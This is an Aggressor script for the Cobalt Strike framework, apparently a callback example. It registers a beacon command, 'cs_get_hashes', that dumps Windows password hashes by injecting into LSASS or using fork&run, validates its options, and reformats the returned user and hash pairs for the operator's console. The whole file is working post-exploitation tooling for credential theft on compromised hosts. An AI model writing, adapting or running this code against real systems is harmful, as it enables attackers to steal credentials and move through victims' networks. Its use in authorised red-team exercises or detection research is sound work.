
# Format the hashes output just the user and hash.
#
# $1 - beacon id
# $2 - result
# $3 - info - Map containing information about the result
#
sub format_hashes {
   # Declare local variables
   local('$bid $result %info $pattern $output @lines $line $user $hash $jid');

   # Assign parameters user friendly names
   ($bid, $result, %info) = @_;
   $jid = %info['jid'];
   #println("**** format_hashes for get_hashes");
   #println("**** arg1 (bid): $bid");
   #println("**** arg2 (result):\n$result");
   #println("**** arg3 (info): " . %info);

   # Skip registered and complete events
   if ("job_registered" eq %info["type"] || "job_completed" eq %info["type"]) {
      return;
   }

   # Find the user and hash information
   $pattern = '(.*?):\d+:.*?:(.*?):::';
   $output = "";
   @lines = split('\n', $2);
   foreach $line (@lines) {
      # println("check line: " . $line);
      if ($line ismatch $pattern) {
         ($user, $hash) = matched();
         $output = $output . "$[25]user\t$hash\n";
      } else {
         $output = $output . $line . "\n";
      }
   }


   # Log the output back to beacon console
   bjoblog($1, $jid, "received output:\n" . $output);

   #println("**** format_hashes done");
}


beacon_command_register(
   "cs_get_hashes",
   "Dump password hashes",

   "Dump password hashes (Warning: Injects into LSASS)\n" .
   "This command requires administrator privileges\n" .
   "If injecting into a pid that process requires administrator privileges\n" .

   "Usage:\n" .
   "   cs_get_hashes [options]\n\n" .

   "Arguments:\n" .
   "   \$1 - beacon id (CS automatically adds this argument)\n\n" .

   "Options (specified in any order):\n" .
   "   --format [yes|no]    - do additional formatting of output. Default is yes\n" .
   "   --pid <pid>          - pid to inject into or use for fork&run\n" .
   "   --arch <arch>        - arch of the pid to inject into use for fork&run\n\n" .

   "Examples (fork and run):\n" .
   "   cs_get_hashes\n" .
   "   cs_get_hashes --format no\n\n" .

   "Examples (process injection):\n" .
   "   cs_get_hashes --pid 1234 --arch x64\n".
   "   cs_get_hashes --pid 1234 --arch x64 --format no\n\n",

   "cs_callback_examples"
);

alias cs_get_hashes {
   # Declare local variables
   local('$bid @valid_opts %opts $opt_cnt $opt_ind $opt $value $info');

   # Validate that we are running as administrator
   $bid = @_[0];
   if (!-isadmin($bid)) {
      berror($bid, "this command requires administrator privileges");
      return;
   }

   # Set the defaults
   %opts["--format"] = "yes";

   # Assign parameters to the opts hash map
   $opt_cnt = size(@_);
   @valid_opts = @("--pid", "--arch", "--format");
   for($opt_ind = 1; $opt_ind < $opt_cnt; $opt_ind++) {
      # Set the arg and value for this iteration
      $opt = @_[$opt_ind];
      $opt_ind++;
      $value = iff( $opt_ind >= $opt_cnt, $null, @_[$opt_ind] );

      # Do some simple validation on opt and value
      if ($opt !in @valid_opts) {
         berror($bid, "$opt is not a valid option.");
         return;
      }
      if ($value is $null || $value in @valid_opts) {
         berror($bid, "Missing or invalid value for the $opt option.");
         return;
      }

      # Save the opt and value into the opts hash
      %opts[$opt] = $value;
   }

   # Validate options
   if (%opts["--format"] !in @("yes", "no")) {
      berror($bid, "format option is not valid: " . %opts["--format"]);
      return;
   }
   if ( (%opts["--pid"] !is $null) || (%opts["--arch"] !is $null) ) {
      # At least one process injection options is used, validate them.
      if (!-isnumber %opts["--pid"] || %opts["--pid"] < 0) {
         berror($bid, "pid is not a valid: " . %opts["--pid"]);
         return;
      }
      if (%opts["--arch"] !in @("x86", "x64")) {
         berror($bid, "arch is not valid, must be x86 or x64.");
         return;
      }
   }

   # Build the info message to use later to info to the script console
   $info = "beacon: $bid will execute the hashdump tool";
   if (%opts["--pid"] >= 0 && %opts["--arch"] in @("x86", "x64")) {
      $info .= " using process injection: \(\'" . %opts["--pid"] . "\' \'" . %opts["--arch"] . "\'\)";
   } else {
      $info .= " using fork&run";
   }

   # Execute the command
   if (%opts["--format"] eq "yes") {
      println("$info and report users and hashes");
      bhashdump($bid, %opts["--pid"], %opts["--arch"], &format_hashes);
      # bhashdump($bid, %opts["--pid"], %opts["--arch"], { format_hashes($1, $2, $3); });
   } else {
      println("$info and report all the information");
      bhashdump($bid, %opts["--pid"], %opts["--arch"]);
   }
}
